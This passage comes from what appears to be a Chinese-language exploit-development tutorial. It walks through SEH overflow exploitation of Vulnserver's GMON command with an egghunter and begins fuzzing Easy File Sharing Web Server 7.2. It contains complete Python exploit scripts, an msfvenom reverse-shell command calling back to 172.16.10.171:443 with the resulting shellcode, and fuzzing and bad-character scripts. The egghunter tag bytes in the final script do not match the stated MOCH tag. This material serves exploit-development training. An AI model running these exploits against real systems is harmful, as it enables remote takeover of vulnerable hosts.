class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;\xb4\x10\x50\x62&quot; #0x625010b4 pop,pop,ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 3515</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p>让我们运行此脚本，再次跳转到<strong>Immunity</strong>，看看发生了什么。</p><p>在我们检查堆栈或内存转储之前，让我们快速检查一下<strong>SEH链</strong></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114708.png" class="lozad"></p><p>完美，<strong>SE处理</strong>程序指向<code>POP POP RET</code>我们所选DLL中的指令，在这种情况下<code>0x625010B4</code>-&gt;<code>essfunc.dll</code></p><p>快速分析堆栈和内存转储也都可以。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011114718.png" class="lozad"></p><p>当然，因为我们只是在应用程序处于崩溃状态时将所有内容拼凑在一起，但是让我们将我们的异常传递给程序，通过该程序将堆栈上的<strong>SE Handler</strong><code>Shift+F9</code>的值发送到<strong>EIP寄存器</strong>，<strong>EIP寄存器</strong>将依次跳转按照我们的指示。<code>POP POP RET</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141010.png" class="lozad"></p><p>完善！正是我们所需要的，将我们的<strong>SE Handler</strong>值<code>625010B4</code>in推送到<code>EIP</code>了我们的<code>POP POP RET</code>说明中，如左上方所示。</p><p>现在，如果我们通过按逐步操作<code>F7</code>，则将首先进行操作<code>POP EBX</code> <code>POP EBP</code>，最后进行操作<code>RETN</code>，这将使我们达到<strong>nSEH</strong>的值-在这种情况下<code>BBBB</code></p><p>只是为了更详细地解释这里发生了什么</p><ul><li><strong>POP EBX</strong> - <em>POP的</em>栈顶到<strong>EBX注册</strong> - <strong>7DEB6AB9</strong></li><li><strong>POP EBP</strong> - <em>POP的</em>栈顶到<strong>EBP注册</strong> - <strong>0237ED34</strong></li><li><strong>RETN</strong> - <em>返回</em> /堆栈的顶部为推动价值<strong>EIP寄存器</strong> - <strong>0237FFC4</strong></li></ul><p>现在您可能会注意到<strong>0237FFC4</strong>看起来很熟悉，如果再次查看<strong>SEH Chain</strong>，我们将看到<strong>0237FFC4</strong>对应于<strong>nSEH</strong></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141031.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141046.png" class="lozad"></p><p>如您所见，<strong>EIP</strong>点也<code>024FFFC4</code>与左上方的指令相关，查看这些指令，我们可以看到“ 42 42 42 42 <code>which represents our</code>“ B” * 4”。</p><h3 id="2-1-5-生成Egghunter"><a href="#2-1-5-生成Egghunter" class="headerlink" title="2.1.5 生成Egghunter"></a>2.1.5 生成Egghunter</h3><p>正如我已经谈到了为什么使用Egghunter以及它们如何工作一样，我将直接进入它，首先让我们分析堆栈以及在这里使用什么。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141059.png" class="lozad"></p><p>如前所述，需要<strong>3515字节</strong>来获取太<strong>nSEH，</strong>而需要<strong>3519字节</strong>来覆盖指向<strong>SE处理程序</strong>的指针，之后我们有<strong>52字节</strong>的空间，在这种情况下，由<code>DDDDD...</code>- 表示：-当然52字节对于我们的<em>shellcode</em>来说不是足够的空间，但是对于Egghunter来说已经足够了，因为我们只需要<strong>32个字节</strong> - 只要我们可以使用相关的Egghunter <em>标签</em>通过其他方式将shellcode放入内存，我们就应该能够执行。</p><p>像往常一样，由于简单，我将在此阶段使用<strong>mona</strong>来帮助我。</p><p><strong>使用Mona生成Egghunter</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona egg -t MOCH</span><br></pre></td></tr></table></figure><p>默认情况下，<strong>mona</strong>会生成一个带有默认标签的Egghunter，它的默认标签<code>w00t</code>可以很好地工作，但是在这里我选择指定一个自定义标签<code>MOCH</code></p><p>完美，现在让我们将其添加到我们的利用脚本中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">egghunter = (&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&quot;</span><br><span class="line">&quot;\xef\xb8\x4d\x4f\x43\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;)</span><br></pre></td></tr></table></figure><p>值得注意的是，Egghunters也应检查以前发现的不良字符。</p><p>我们还将<code>tag</code>在变量<strong>TWICE中</strong>定义变量，以便Egghunter在执行和搜索内存时不会发现自己。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egg = &apos;MOCHMOCH&apos;</span><br></pre></td></tr></table></figure><p>我还将花时间<code>junk</code>用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buffer += egghunter</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br></pre></td></tr></table></figure><p>这将允许我们在<strong>SEH</strong>之后直接添加Egghunter shell代码，然后添加一堆D来填充剩余空间，以防万一。</p><p>现在让我们生成一些shell代码，对整体漏洞进行最后调整，然后尝试一下。</p><h3 id="2-1-6-跳到Egghunter"><a href="#2-1-6-跳到Egghunter" class="headerlink" title="2.1.6 跳到Egghunter"></a>2.1.6 跳到Egghunter</h3><p>现在只是重申此处的目的是<strong>超速**</strong>SEH<strong>，执行一个<code>POP POP RET</code>序列，该序列</strong>又将nSEH<strong>的值</strong>压<strong>入</strong>EIP寄存器** -在这种情况下，我们希望将Egghunter的地址放在<strong>nSEH之上</strong>或以某种形式的指令将使我们跳入我们的Egghunter shellcode，再次，如果我们检查堆栈，我们会发现我们走得太远。</p><h3 id="2-1-7-生成Shellcode和最终利用"><a href="#2-1-7-生成Shellcode和最终利用" class="headerlink" title="2.1.7 生成Shellcode和最终利用"></a>2.1.7 生成Shellcode和最终利用</h3><p>一如既往，我将在这里使用MSFVenom生成一些shellcode，因为我们并不是真正在与高级防病毒软件或任何其他工具作斗争，所以不必花哨，我们只需使用下面的代码即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m0chan@kali:/&gt; msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure><p>现在生成了很棒的shell代码，我们只是将其弹出到最终的利用中。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141111.png" class="lozad"></p><p>在这种情况下，你可以看到我们会从内存地址跳转<strong>0237FFC4</strong>到<strong>0237FFCC</strong>这将是在那里我们Egghunter会坐下。</p><p>现在在这里，我们只是用<strong>0237FFCC</strong>覆盖<strong>nSEH</strong>的地址，但是就像我说的那样，它不是很实用，并且最好做一个简单的短跳转（也称为操作码）-但是有一个小的变化。该指令只有<strong>2个字节</strong>，<strong>nSEH</strong>需要<strong>4个字节。</strong><code>EB``EB</code></p><p>这不是一个大问题，因为我们可以简单地使用<code>NOPS</code>aka，<code>\x90</code>所以我们在这里要做的是填充<strong>nSEH</strong>，<code>\x90\x90</code>这意味着<strong>2/4个字节</strong>已满，然后是代表跳转6个字节的<code>EB</code>指令<code>\xeb\x06</code>。现在，<strong>nSEH</strong>中填充了<strong>4/4个字节</strong></p><p>我们利用现在技术上跳<strong>8个字节</strong>，但我们只需要跳<strong>6个字节</strong>，因为我们<em>真的</em>只是<em>滑动</em>下来<strong>NOPS</strong>所以6个字节是所有的需要。</p><p>太好了，现在在漏洞利用程序中更新<strong>nSEH</strong>变量以反映以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br></pre></td></tr></table></figure><p>当然，<strong>little endian</strong>再次是相反顺序的原因。</p><p><strong>最终利用</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">#Vulnserver GMON SEH Overflow w/ Egghunter</span><br><span class="line">#Author: m0chan</span><br><span class="line">#Date: 28/08/2019</span><br><span class="line"></span><br><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot; #0x909006be - nop,nop,jump 6 bytes with EB into egghunter</span><br><span class="line">seh = &quot;\xb4\x10\x50\x62&quot; #0x625010br pop,pop,ret</span><br><span class="line"></span><br><span class="line">eggnops = &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line">egghunter = (</span><br><span class="line">&quot;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74&quot;</span><br><span class="line">&quot;\xef\xb8\x74\x65\x65\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7&quot;)</span><br><span class="line"></span><br><span class="line">egg = &apos;MOCHMOCH&apos;</span><br><span class="line"></span><br><span class="line">#msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.171 LPORT=443 -e x86/shikata_ga_nai EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x80\x0a\x0c\x0d&quot;</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">&quot;\xda\xc4\xbf\xcf\xa2\xc0\xf1\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1&quot;</span><br><span class="line">&quot;\x52\x83\xeb\xfc\x31\x7b\x13\x03\xb4\xb1\x22\x04\xb6\x5e\x20&quot;</span><br><span class="line">&quot;\xe7\x46\x9f\x45\x61\xa3\xae\x45\x15\xa0\x81\x75\x5d\xe4\x2d&quot;</span><br><span class="line">&quot;\xfd\x33\x1c\xa5\x73\x9c\x13\x0e\x39\xfa\x1a\x8f\x12\x3e\x3d&quot;</span><br><span class="line">&quot;\x13\x69\x13\x9d\x2a\xa2\x66\xdc\x6b\xdf\x8b\x8c\x24\xab\x3e&quot;</span><br><span class="line">&quot;\x20\x40\xe1\x82\xcb\x1a\xe7\x82\x28\xea\x06\xa2\xff\x60\x51&quot;</span><br><span class="line">&quot;\x64\xfe\xa5\xe9\x2d\x18\xa9\xd4\xe4\x93\x19\xa2\xf6\x75\x50&quot;</span><br><span class="line">&quot;\x4b\x54\xb8\x5c\xbe\xa4\xfd\x5b\x21\xd3\xf7\x9f\xdc\xe4\xcc&quot;</span><br><span class="line">&quot;\xe2\x3a\x60\xd6\x45\xc8\xd2\x32\x77\x1d\x84\xb1\x7b\xea\xc2&quot;</span><br><span class="line">&quot;\x9d\x9f\xed\x07\x96\xa4\x66\xa6\x78\x2d\x3c\x8d\x5c\x75\xe6&quot;</span><br><span class="line">&quot;\xac\xc5\xd3\x49\xd0\x15\xbc\x36\x74\x5e\x51\x22\x05\x3d\x3e&quot;</span><br><span class="line">&quot;\x87\x24\xbd\xbe\x8f\x3f\xce\x8c\x10\x94\x58\xbd\xd9\x32\x9f&quot;</span><br><span class="line">&quot;\xc2\xf3\x83\x0f\x3d\xfc\xf3\x06\xfa\xa8\xa3\x30\x2b\xd1\x2f&quot;</span><br><span class="line">&quot;\xc0\xd4\x04\xff\x90\x7a\xf7\x40\x40\x3b\xa7\x28\x8a\xb4\x98&quot;</span><br><span class="line">&quot;\x49\xb5\x1e\xb1\xe0\x4c\xc9\x12\xe4\x44\xa2\x03\x07\x58\xb5&quot;</span><br><span class="line">&quot;\x68\x8e\xbe\xdf\x9e\xc7\x69\x48\x06\x42\xe1\xe9\xc7\x58\x8c&quot;</span><br><span class="line">&quot;\x2a\x43\x6f\x71\xe4\xa4\x1a\x61\x91\x44\x51\xdb\x34\x5a\x4f&quot;</span><br><span class="line">&quot;\x73\xda\xc9\x14\x83\x95\xf1\x82\xd4\xf2\xc4\xda\xb0\xee\x7f&quot;</span><br><span class="line">&quot;\x75\xa6\xf2\xe6\xbe\x62\x29\xdb\x41\x6b\xbc\x67\x66\x7b\x78&quot;</span><br><span class="line">&quot;\x67\x22\x2f\xd4\x3e\xfc\x99\x92\xe8\x4e\x73\x4d\x46\x19\x13&quot;</span><br><span class="line">&quot;\x08\xa4\x9a\x65\x15\xe1\x6c\x89\xa4\x5c\x29\xb6\x09\x09\xbd&quot;</span><br><span class="line">&quot;\xcf\x77\xa9\x42\x1a\x3c\xc9\xa0\x8e\x49\x62\x7d\x5b\xf0\xef&quot;</span><br><span class="line">&quot;\x7e\xb6\x37\x16\xfd\x32\xc8\xed\x1d\x37\xcd\xaa\x99\xa4\xbf&quot;</span><br><span class="line">&quot;\xa3\x4f\xca\x6c\xc3\x45&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (3515-len(egg + shellcode))</span><br><span class="line">print &quot;[*] Adding Egghunter tag &quot; + egg + &quot; alongside A Buffer&quot;</span><br><span class="line">buffer += egg</span><br><span class="line">buffer += shellcode</span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with %s bytes&quot; %len(buffer) + &quot; A&apos;s&quot;</span><br><span class="line">buffer += nseh</span><br><span class="line">print &quot;[*] Overwriting nSEH Value with &quot; + nseh</span><br><span class="line">buffer += seh #0x625010br pop,pop,ret</span><br><span class="line">print &quot;[*] Overwriting SEH Value with &quot; + seh</span><br><span class="line">buffer += eggnops</span><br><span class="line">buffer += egghunter</span><br><span class="line">junk = &quot;J&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GMON with everything containing %s bytes&quot; %len(buffer)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GMON with %s bytes&quot; %len(buffer)</span><br></pre></td></tr></table></figure><p><code>443</code>假设我们有一个打开的监听器，我们将收到一个反向外壳-在这里值得注意的是，这<strong>只能</strong>在<code>Windows 7 x86</code>此工作是由于Egghunter启动系统调用的方式，即<code>INT 2E</code>-整个体系结构稍有不同，因此我们的<strong>mona</strong> Egghunter将仅在 <code>32 Bit</code></p><p>我决定创建此小图来从较高的角度表示漏洞，并尝试显示每个相关的跳转-我的visio技能不是很好，所以请问！</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141125.png" class="lozad"></p><h2 id="2-2-无需Egghunter的轻松文件共享Web服务器7-2"><a href="#2-2-无需Egghunter的轻松文件共享Web服务器7-2" class="headerlink" title="2.2 无需Egghunter的轻松文件共享Web服务器7.2"></a>2.2 无需Egghunter的轻松文件共享Web服务器7.2</h2><p>轻松文件共享Web服务器是Win XP / Win 7时代的遗留软件，它使访问者可以轻松地通过选择的Web浏览器轻松上传/下载文件，尽管它在被<strong>Stack Overflows</strong>充斥着众多漏洞时非常有用到<strong>SEH溢出</strong>。</p><h3 id="2-2-1-模糊和发现崩溃"><a href="#2-2-1-模糊和发现崩溃" class="headerlink" title="2.2.1 模糊和发现崩溃"></a>2.2.1 模糊和发现崩溃</h3><p>与之前的示例类似，我将<em>停留</em>在<em>模糊测试</em>阶段，因为我不想花费大量时间对每个输入/参数进行模糊测试，也就是说，在此示例中，我们将以<strong>HTTP</strong>协议为目标并<code>boozfuzz</code>支持<strong>HTTP</strong>模糊测试，因此请检查一下！我很快将只写一篇关于模糊测试和不同技术的文章。</p><p>由于该漏洞位于<strong>HTTP中，</strong>因此有几种方法可以使用python做到这一点，我们可以使用该<code>requests</code>库，也可以仅通过端口80连接并发送原始<strong>HTTP请求。</strong>-我将在此处输入Port 80 / Raw Requests，并可能<code>requests</code>在最后重写脚本。</p><p>首先让我们从一个基本的FUZZ脚本开始，直到发生崩溃为止，这里的漏洞位于<code>GET</code>变量内部，底层应用程序试图在其中获取传递的输入内容，<code>GET</code>并且无法进行边界检查和任何清理等操作。</p><p>这是一个示例示例，我们将使用python发送HTTP请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /m0chan.txtAAAAAAAAAbufferhereAAAAAAA HTTP/1.1</span><br><span class="line">Host: 172.16.10.15</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: SESSIONID=5905; UserID=; PassWD=</span><br><span class="line">If-Modified-Since: Fri, 11 May 2012 10:11:48 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>正如您在<strong>第1行上</strong>看到的那样，我们正在请求<code>m0chan.txt</code>旁边的缓冲区/图案。-让我们快速编写一些python脚本以使其变得更简单。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 5000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>一旦完成运行（只要我们已<code>EFSWS</code>打开<strong>Immunity</strong>和/或连接），我们就会注意到我们实际上造成了崩溃，让我们分析下面的屏幕截图，看看我们做了什么。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141145.png" class="lozad"></p><p>如您所见，在这种情况下，我们已经用用户提供的输入超出了<strong>nSEH</strong>和<strong>SEH</strong>的地址<code>AAAA</code> <code>41414141</code>-我们也对我们有些新的限制… <strong>EAX寄存器</strong> -如您所见，右上方<code>EAX</code>包含的<code>41414141</code>是我们的<code>A</code>缓冲区。-稍后可能会有用。</p><h3 id="2-2-2-寻找偏移"><a href="#2-2-2-寻找偏移" class="headerlink" title="2.2.2 寻找偏移"></a>2.2.2 寻找偏移</h3><p>现在，我们已经分析了崩溃并找到了<em>漏洞，</em>我们可以继续计算偏移量，并计算出使<code>A&#39;s</code>我们超出<strong>SEH</strong>和<strong>nSEH</strong>指针所需的时间。为此，我将通过以下命令使用<strong>mona</strong>来计算非重复字符串（也称为<strong>循环模式）</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona pc 5000</span><br></pre></td></tr></table></figure><p>现在，我将<code>fuzzer.py</code>再次使用我的脚本并将其修改为发送我的模式<code>5000</code> <code>A&#39;s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6....&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>我们的应用程序现在将返回崩溃状态并报告<strong>访问冲突，</strong>但是如果我们检查<strong>SEH Chain</strong>并跳转到堆栈上的<strong>SE Handler</strong>的值，我们将注意到它实际上已经超出了我们的循环模式，而不是一长串<code>A&#39;s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona findmsp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona po 3Ff4</span><br></pre></td></tr></table></figure><p>运行以上任一命令都将报告，超出<strong>nSEH</strong>值的偏移量是<strong>4061字节</strong> -我们现在可以修改漏洞利用以反映<code>&quot;A&quot; * 4061</code></p><p><img alt="img" data-src="https://i.imgur.com/KTyiqOU.png" class="lozad"></p><h3 id="2-2-3-寻找坏字符"><a href="#2-2-3-寻找坏字符" class="headerlink" title="2.2.3 寻找坏字符"></a>2.2.3 寻找坏字符</h3><p>在这里，我们将采用与上述相同的方法，在该方法中，我们将每个可能的字符发送到缓冲区旁边，并分析它们在内存转储中的显示方式-在此还值得注意的是，我们必须为<code>\n</code>＆排除字符，<code>\r</code>因为我们没有希望在我们的缓冲区旁边发送装盒返回和新行，以有效地分解原始<strong>HTTP请求</strong>。</p><p>我将在此处使用以下脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;C&quot;*4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">badchars = (&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;</span><br><span class="line">&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br><span class="line">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;</span><br><span class="line">&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;</span><br><span class="line">&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;</span><br><span 